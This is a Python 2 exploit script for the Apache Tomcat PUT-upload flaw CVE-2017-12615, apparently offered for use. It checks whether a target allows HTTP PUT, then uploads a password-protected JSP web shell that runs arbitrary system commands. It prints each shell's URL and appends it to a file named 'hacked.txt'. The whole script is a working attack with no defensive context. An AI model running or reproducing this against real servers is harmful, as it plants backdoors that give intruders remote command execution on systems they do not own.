#!/usr/bin/env python
#! -*- coding:utf-8 -*- 
import httplib
import sys
import time
def Is_cve2017_12615(ipport):
    body = '''<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp
    +"\\n");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();}%><%if("023".equals(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){out.println("<pre>"+excuteCmd(request.getParameter("cmd"))+"</pre>");}else{out.println(":-)");}%>'''
    try:
        conn = httplib.HTTPConnection(ipport)
        conn.request(method='OPTIONS', url='/ffffzz')
        headers = dict(conn.getresponse().getheaders())
        if 'allow' in headers and \
        headers['allow'].find('PUT') > 0 :
            conn.close()
            conn = httplib.HTTPConnection(ipport)
            url = "/" + str(int(time.time()))+'.jsp/'
            #url = "/" + str(int(time.time()))+'.jsp::$DATA'
            conn.request( method='PUT', url= url, body=body)
            res = conn.getresponse()
            if res.status  == 201 :
                #print 'shell:', 'http://' + ipport + url[:-7]
                print 'shell:', 'http://' + ipport + url[:-1]
                with open("hacked.txt",'a') as hf:
                    hf.write('shell:', 'http://' + ipport + url[:-1])
            elif res.status == 204 :
                print 'file exists'
            else:
                print 'error'
            conn.close()
        else:
            print 'Server not vulnerable'
            
    except Exception,e:
        print 'Error:', e